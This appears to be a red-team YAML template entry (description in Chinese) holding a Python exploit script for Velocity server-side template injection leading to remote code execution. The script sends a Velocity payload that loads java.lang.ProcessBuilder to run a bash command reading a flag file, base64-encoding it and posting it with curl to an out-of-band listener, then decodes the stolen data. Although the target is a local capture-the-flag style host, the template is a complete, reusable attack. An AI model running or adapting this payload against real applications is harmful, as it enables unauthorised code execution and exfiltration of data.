- name: velocity-ssti-rce-simple
  description: 创建针对 Velocity SSTI 导致远程代码执行的武器化 YAML 模板，包含极简的 Runtime.exec + BufferedReader
    载荷。
  lang: python
  template: "import base64\nfrom redteam_sdk import HttpClient, OOBReceiver, save_context,\
    \ load_context\n\ndef main():\n    target = \"http://host.docker.internal:9443\"\
    \n    try:\n        # 启动OOB监听器，获取带外URL\n        with OOBReceiver(port=8765) as\
    \ oob:\n            oob_url = oob.url\n\n            # 构造命令：读取flag文件，base64编码，通过curl\
    \ POST到OOB\n            # 注意命令字符串中不能有未转义的双引号\n            cmd = \"cat /flag |\
    \ base64 -w0 | curl -X POST -d @- {}/data\".format(oob_url)\n            # 确保命令中的双引号被正确转义（此处无引号，但保留逻辑）\n\
    \            escaped_cmd = cmd.replace('\"', '\\\\\"')\n\n            # 构造Velocity\
    \ SSTI payload，执行ProcessBuilder调用shell命令\n            payload = (\n          \
    \      \"#set($x='')\"\n                \"#set($cmd=[\\\"/bin/bash\\\",\\\"-c\\\
    \",\\\"{}\\\"])\"\n                \"#set($pbClass=$x.class.forName(\\\"java.lang.ProcessBuilder\\\
    \"))\"\n                \"#set($con=$pbClass.getConstructor($x.class.forName(\\\
    \"java.util.List\\\")))\"\n                \"#set($pb=$con.newInstance($cmd))\"\
    \n                \"#set($p=$pb.start())\"\n                \"$p.waitFor()\"\n\
    \            ).format(escaped_cmd)\n\n            # 发送请求，注入点为主页的text参数\n     \
    \       client = HttpClient(base_url=target)\n            resp = client.get(\"\
    /\", params={\"text\": payload})\n            # 仅做简单状态检查（不影响后续）\n            if\
    \ not hasattr(resp, \"status_code\") or resp.status_code != 200:\n           \
    \     # 可能并非200，但payload仍已执行\n                pass\n\n            # 等待OOB请求（超时15秒）\n\
    \            request_data = oob.wait_for_request(timeout=15)\n            if request_data:\n\
    \                # 提取POST body中的base64编码数据\n                body = request_data.body\
    \  # 预期为bytes\n                flag_b64 = body.decode().strip()\n            \
    \    # 解码得到flag原文\n                flag = base64.b64decode(flag_b64).decode()\n\
    \                print(f\"Flag: {flag}\")\n                # 保存上下文供后续步骤使用\n  \
    \              save_context({\"flag\": flag})\n            else:\n           \
    \     print(\"No OOB request received within timeout.\")\n    except Exception\
    \ as e:\n        print(f\"Error: {e}\")\n    finally:\n        print(\"STEP_OK\"\
    )\n\nif __name__ == \"__main__\":\n    main()"
